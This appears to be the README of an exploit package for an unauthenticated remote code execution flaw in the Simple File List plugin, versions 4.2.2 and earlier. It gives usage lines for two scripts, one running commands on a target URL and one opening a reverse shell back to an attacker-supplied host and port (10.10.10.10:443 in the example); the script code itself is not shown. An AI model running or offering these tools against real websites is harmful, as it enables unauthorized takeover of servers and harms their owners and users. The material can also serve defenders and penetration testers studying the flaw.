# Unauthenticated Remote Code Execution in Simple File List <= 4.2.2
### Two Scripts; One for basic RCE, the other for a reverse shell

#### Usage: sfl_rce.py
```bash
python3 sfl_rce.py <target_url>
Ex: python3 sfl_rce.py http://example.com
```

#### Usage: sfl_rev.py
```bash
python3 sfl_rev.py <target_url> <lhost> <lport>
Ex: python3 sfl_rev.py http://exaple.com 10.10.10.10 443
```
